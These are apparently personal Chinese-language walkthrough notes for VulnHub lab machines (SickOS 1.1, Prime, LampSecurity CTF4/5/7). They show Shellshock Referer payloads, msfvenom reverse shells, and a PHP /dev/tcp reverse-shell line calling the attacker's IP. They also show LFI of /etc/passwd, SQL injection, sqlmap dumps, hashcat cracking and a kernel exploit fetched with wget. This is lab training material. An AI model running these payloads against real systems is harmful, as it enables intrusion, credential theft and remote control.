+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看系统有哪些用户</span><br><span class="line">	cat /etc/passwd</span><br><span class="line">使用john@123作为密码和用户名组合ssh登录</span><br><span class="line">	最后发现是sickos用户，这个是管理员权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="SICKOS-1-1方法2"><a href="#SICKOS-1-1方法2" class="headerlink" title="SICKOS 1.1方法2"></a>SICKOS 1.1方法2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nitko -h <span class="number">192.168</span><span class="number">.213</span><span class="number">.142</span> -useproxy http://<span class="number">192.168</span><span class="number">.213</span><span class="number">.142</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668178942242.png" alt="1668178942242"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellshock bash漏洞</span><br><span class="line">https://blog.csdn.net/weixin_65527369/article/details/126811820</span><br><span class="line">我的理解是cgi程序把网页中请求头中部分内容加载到环境变量，请求头中这部分内容被植入恶意代码，写成函数创建语句（以前版本bash对函数创建语句清理不够），绕过检测，执行恶意代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668410723084.png" alt="1668410723084"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试是否有shellshock</span></span><br><span class="line">curl -v --proxy 192.168.213.142:3128 192.168.213.142/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#x27;Content-Type: text/plain&#x27;; echo; echo; /usr/bin/id;exit&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者如下简化，-v会显示完整数据包，发送和接收都有</span></span><br><span class="line">curl --proxy 192.168.213.42:3128 192.168.213.142/cgi-bin/status -H &quot;Referer() &#123; :;&#125;; echo &#x27;Content-Type:text/plain&#x27;; echo; /usr/bin/id;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用 msfvenom构造反弹shell</span></span><br><span class="line">sudo msfvenom -p cmd/unix/reverse_bash lhost=192.168.213.130 lport=443</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668411466836.png" alt="1668411466836"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此处sh需要改成/bash/sh</span></span><br><span class="line">sudo -v --proxy 192.168.213.142:3128 192.168.213.142/cgi-bin/status -H &quot;Referer:() &#123; :;&#125;; ............&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先监听这个监听443端口</span></span><br><span class="line">sudo nc -lvnp 443</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">dpkg -l查看系统装了哪些软件	发现装了python</span></span><br><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">dpkg -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用python获得一个交互性更好的shell</span></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后开始乱翻 翻到/var/www</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668423507254.png" alt="1668423507254"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此处没有ll命令，使用<span class="built_in">ls</span> -liah</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668423655312.png" alt="1668423655312"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成一个python的反弹shell</span></span><br><span class="line">sudo msfvenom -p cmd/unix/reverse_python lhost=192.168.213.130 lport=444 -f raw</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668424067784.png" alt="1668424067784"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vi 不会操作</span></span><br><span class="line">echo &quot;.....&quot; &gt;&gt; connect.py</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后监听444端口就拿到root权限了</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Prime"><a href="#Prime" class="headerlink" title="Prime"></a>Prime</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对应虚拟机ubuntu <span class="number">64</span>-bit</span><br><span class="line"><span class="comment">#无法连接虚拟设备 sata0:1</span></span><br><span class="line">https://blog.csdn.net/springslx/article/details/<span class="number">126777923</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668478034319.png" alt="1668478034319"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#目录爆破 扫出来/dev 提示扫的不够努力</span></span><br><span class="line">dirb http://192.168.213.145</span><br><span class="line"><span class="comment">#扫文件</span></span><br><span class="line">dirb http://192.168.213.145 -X .php,.txt,.zip</span><br><span class="line"><span class="comment">#/secret.txt告诉做些fuzz 然后给了一个工具github地址，但是不用这个工具,还有让我们查看location.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668480065073.png" alt="1668480065073"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wfuzz相当于猜FUZZ是本来应该是啥，看回显数据包的内容</span></span><br><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.213.145/index.php?FUZZ=123</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里很多回显136chars的，把它屏蔽, 查出来关键字是file</span></span><br><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.213.145/index.php?FUZZ=123</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668510056910.png" alt="1668510056910"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用file去看location.txt,获知关键字secrettier360,在别的php使用这个</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668510263874.png" alt="1668510263874"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#curl http://192.168.213.145/image.php?secrettier360=../../../../../../etc/passwd		这个可以看</span></span><br><span class="line"><span class="comment">#一般来说小于1000的都是功能型账号，意义不大</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668510992649.png" alt="1668510992649"></p>
+<p><img src="/2023/07/25/vulnhub/1668511008145.png" alt="1668511008145"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获得一个可能的密码	尝试ssh登录，失败</span></span><br><span class="line"><span class="comment">#转至web wordpress文件管理系统，全球领先</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668511398770.png" alt="1668511398770"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	用户枚举，枚举出victor</span></span><br><span class="line">sudo wpscan --url http://192.168.213.145/wordpress -e u</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	wordpress后台登录地址/wordpress/wp-login.php	使用victor follow_the_ippsec登录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	Appearance-&gt;Theme Editor-&gt;secret.php(只有这个文件有写入权限)</span></span><br><span class="line"><span class="comment">#	kali搞好监听</span></span><br><span class="line"><span class="comment">#	访问http://192.168.213.145/wordpress/wp-content/themes/twentynineteen/secret.php</span></span><br><span class="line"><span class="comment">#获得初级shell</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668514296667.png" alt="1668514296667"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拿到一个权限到处看看，用户目录，根目录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#尝试使用内核提权 uname -a我的是Linux ubuntu 4.15.0 视频是Linux ubuntu 4.10.0-28</span></span><br><span class="line">searchsploit Linux ubuntu 4.10.0-28</span><br><span class="line"><span class="comment">#第一个不是提权</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668517960559.png" alt="1668517960559"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -m 下载到本地</span></span><br><span class="line">searchsploit ubuntu -m 45010</span><br><span class="line"><span class="built_in">cat</span> 45010.c</span><br><span class="line"><span class="comment">#得到使用方式 gcc编译</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668518419779.png" alt="1668518419779"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里有个思路，可以在靶机编译，也在模拟的靶机环境下编译完上传到靶机</span></span><br><span class="line">sudo php -S 0:80		(/home/hyy19)</span><br><span class="line"><span class="comment">#靶机初级shell</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.213.130/45010.c</span><br><span class="line"><span class="comment">#编译45010.c文件  -o输出45010文件</span></span><br><span class="line">gcc 45010.c -o 45010</span><br><span class="line"><span class="comment">#执行45010文件</span></span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">chmod</span> -x 45010</span><br><span class="line">./45010			<span class="comment">#但是失败了感觉是那个ubuntu版本变了的问题</span></span><br><span class="line"><span class="comment">#最后搞个好点的shell</span></span><br><span class="line">dpkg -l</span><br><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Prime-OpenSSL"><a href="#Prime-OpenSSL" class="headerlink" title="Prime OpenSSL"></a>Prime OpenSSL</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按上一篇拿到初级权限</span></span><br><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">whoami</span><br><span class="line">ip a</span><br><span class="line">uname -a</span><br><span class="line">sudo -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668774583114.png" alt="1668774583114"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	不需要输入root密码就能执行的文件</span></span><br><span class="line"><span class="built_in">ls</span> -liah	只有执行权限</span><br><span class="line"><span class="comment">#但是还是需要输密码?	此处需要输入完整路径 先进入目录会要求输入root密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668774745566.png" alt="1668774745566"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	通过备份查找密码	2&gt;/dev/null 是把报错信息删掉	一般是匹配backup pass passwd password</span></span><br><span class="line">find / -name <span class="string">&#x27;*backup_*&#x27;</span> 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668775255928.png" alt="1668775255928"></p>
+<p><img src="/2023/07/25/vulnhub/1668775340523.png" alt="1668775340523"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	根据目录这是数据库的备份enc密码</span></span><br><span class="line">sudo /home/saket/enc		<span class="comment">#此处一定要输入完整路径 先进入目录会要求输入root密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668775915536.png" alt="1668775915536"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#多出来2个文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668775966039.png" alt="1668775966039"></p>
+<p><img src="/2023/07/25/vulnhub/1668776291462.png" alt="1668776291462"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	对&#x27;ippsec&#x27;进行加密</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;ippsec&#x27;</span> | <span class="built_in">md5sum</span> | awk -F<span class="string">&#x27;  &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#关于openssl指令用法</span></span><br><span class="line">https://www.cnblogs.com/yangxiaolan/p/6256838.html</span><br><span class="line"><span class="comment">#	不知道是那种加密方式，那就都试试</span></span><br><span class="line"><span class="comment">#	首先openssl help复制保存可能的编码方式到openssl_help.txt</span></span><br><span class="line"><span class="comment">#	gsub里面是替换所有空格为换行 	wc -l查看有多少行		uniq去重</span></span><br><span class="line">awk <span class="string">&#x27;&#123;gsub(/ /,&quot;\n&quot;);print&#125;&#x27;</span> openssl_help.txt | <span class="built_in">sort</span> | <span class="built_in">wc</span> -l</span><br><span class="line">awk <span class="string">&#x27;&#123;gsub(/ /,&quot;\n&quot;);print&#125;&#x27;</span> openssl_help.txt | <span class="built_in">sort</span> | <span class="built_in">uniq</span></span><br><span class="line">awk <span class="string">&#x27;&#123;gsub(/ /,&quot;\n&quot;);print&#125;&#x27;</span> openssl_help.txt | <span class="built_in">sort</span> | <span class="built_in">uniq</span> &gt; openssl_encode.txt</span><br><span class="line"></span><br><span class="line">openssl enc <span class="built_in">help</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668778619139.png" alt="1668778619139"></p>
+<p><img src="/2023/07/25/vulnhub/1668779081141.png" alt="1668779081141"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo -n加不加 打印用了那种加密方式 把错误报告删掉</span></span><br><span class="line"><span class="comment">#	但是乱码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668779627165.png" alt="1668779627165"></p>
+<p><img src="/2023/07/25/vulnhub/1668780162086.png" alt="1668780162086"></p>
+<p><img src="/2023/07/25/vulnhub/1668780313432.png" alt="1668780313432"></p>
+<p><img src="/2023/07/25/vulnhub/1668780424114.png" alt="1668780424114"></p>
+<p><img src="/2023/07/25/vulnhub/1668780551837.png" alt="1668780551837"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#博主得到的密码 tribute_to_ippsec</span></span><br><span class="line">Dont worry saket one day we will reach to out destination very soon.And <span class="keyword">if</span> you forget your username thenn use your old password --&gt; <span class="string">&#x27;tribute_to_ippsec&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ssh登录saket</span></span><br><span class="line"><span class="comment">#python换个交互界面</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668781130186.png" alt="1668781130186"></p>
+<p><img src="/2023/07/25/vulnhub/1668781380344.png" alt="1668781380344"></p>
+<p><img src="/2023/07/25/vulnhub/1668781453808.png" alt="1668781453808"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	明确你是什么用户，你进一步提权的用户是谁</span></span><br><span class="line"><span class="comment">#	你是谁 你对哪些文件有哪些权限</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="LampSecurity-CTF4"><a href="#LampSecurity-CTF4" class="headerlink" title="LampSecurity-CTF4"></a>LampSecurity-CTF4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	改成NAT	192.168.213.146</span></span><br><span class="line"><span class="comment">#	nmap ip146 端口 22 25smtp 80 631closed</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	80端口	....id=2&#x27;	发现注入漏洞</span></span><br><span class="line">sudo sqlmap -u <span class="string">&quot;http://192.168.213.146/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</span> --dbs --dump --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668857669251.png" alt="1668857669251"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ssh的登录根据提示来 -oK 按tab有提示</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668858247995.png" alt="1668858247995"></p>
+<h3 id="LampSecurity-CTF5"><a href="#LampSecurity-CTF5" class="headerlink" title="LampSecurity-CTF5"></a>LampSecurity-CTF5</h3><p><img src="/2023/07/25/vulnhub/1668859018812.png" alt="1668859018812"></p>
+<p><img src="/2023/07/25/vulnhub/1668861013504.png" alt="1668861013504"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看80端口  获知nanocms	使用谷歌搜索</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668865809147.png" alt="1668865809147"></p>
+<p><img src="/2023/07/25/vulnhub/1668865915803.png" alt="1668865915803"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	username admin password 9d2f75377ac0ab991d40c91fd27e52fd</span></span><br><span class="line"><span class="comment"># md5解密得到 shannon</span></span><br><span class="line">hash-identifier <span class="string">&#x27;9d2f75377ac0ab991d40c91fd27e52fd&#x27;</span>		<span class="comment">#知道是md5</span></span><br><span class="line">sudo gunzip /usr/share/wordlists/rockyou.txt.gz			<span class="comment">#压缩包是自带的</span></span><br><span class="line">sudo hashcat -m 0 -a 0 9d2f75377ac0ab991d40c91fd27e52fd  /usr/share/wordlists/rockyou.txt</span><br><span class="line">	<span class="comment">#使用这个去破解</span></span><br><span class="line"><span class="comment">#也可以直接去在线得到破解</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#破解完就登录进去了</span></span><br><span class="line"><span class="comment">#进入后台找找个页面就可以写代码了</span></span><br><span class="line">	&lt;?php <span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.213.130/1234 0&gt;&amp;1&#x27;&quot;</span>); ?&gt;</span><br><span class="line">	https://blog.csdn.net/weixin_43486390/article/details/111385962</span><br><span class="line">	-c <span class="string">&quot;cmd string&quot;</span></span><br><span class="line">	-i If the -i option is present, the shell is interactive. </span><br><span class="line">	-i 意为创建一个交互式的bash shell</span><br><span class="line">	0	STDIN_FILENO	标准输入	一般键盘</span><br><span class="line">	1	STDOUT_FILENO	标准输出	显示屏 用户控制台</span><br><span class="line">	2	STDERR_FILENO	标准错误	出错信息输出</span><br><span class="line">	第一个&amp;是为了使bash把1解释成标准输出而不是文件1</span><br><span class="line">	最后一个&amp;是为了让bash在后台执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668867117913.png" alt="1668867117913"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	cat /etc/passwd		查看发现有很多用户	尝试从别的用户目录下得到更多信息 比如密码</span></span><br><span class="line"><span class="comment">#	grep -R -i pass /home/* 2&gt;/dev/null		可以读到文件里面的内容</span></span><br><span class="line"><span class="comment">#		-i	Ignore case  distinctions  in  patterns  and  input  data,  so that characters that differ only in case match each other.		忽略大小写</span></span><br><span class="line"><span class="comment">#		-R	--dereference-recursive Read   all   files   under  each  directory, recursively.   Follow  all  symbolic  links, unlike -r.	反引用递归</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668869099666.png" alt="1668869099666"></p>
+<p><img src="/2023/07/25/vulnhub/1668869178918.png" alt="1668869178918"></p>
+<h3 id="LampSecurity-CTF7"><a href="#LampSecurity-CTF7" class="headerlink" title="LampSecurity-CTF7"></a>LampSecurity-CTF7</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	不加-p端口会少信息</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668871415340.png" alt="1668871415340"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	8080端口登录框直接注入进来  </span></span><br><span class="line">	<span class="string">&#x27; or 1=1 -- </span></span><br><span class="line"><span class="string">#	找到一个文件上传的点</span></span><br><span class="line"><span class="string">	http://192.168.213.148:8080/readings.php?id=1&amp;op=edit</span></span><br><span class="line"><span class="string">#	在这个路径能找到</span></span><br><span class="line"><span class="string">	http://192.168.213.148/assets/shell.php</span></span><br><span class="line"><span class="string">#	获得初级权限</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668933696942.png" alt="1668933696942"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#目录扫描得到http://192.168.213.148/inc/phpinfo.php得到/var/www</span></span><br><span class="line"><span class="comment">#/var/www/admin/inc/db.php找到连接数据库的文件 用户名root无密码		inc include</span></span><br><span class="line">mysql -uroot	登录</span><br><span class="line">mysql.website.users查到用户名brian md5破解得到my2cents</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	获知md5</span></span><br><span class="line">hash-identifier <span class="string">&#x27;e22f07b17f98e0d9d364584ced0e3c18&#x27;</span></span><br><span class="line">sudo hashcat -m 0 -a 0 e22f07b17f98e0d9d364584ced0e3c18 /usr/share/wordlists/rockyou.txt</span><br><span class="line">	-m, --hash-type=NUM Hash-<span class="built_in">type</span>, see references below</span><br><span class="line">	-a, --attack-mode=NUM Attack-mode, see references below</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668936142440.png" alt="1668936142440"></p>
+<p><img src="/2023/07/25/vulnhub/1668936158968.png" alt="1668936158968"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	得到my2cents</span></span><br><span class="line"><span class="comment">#	使用ssh连接</span></span><br><span class="line"><span class="comment">#	直接是root权限</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
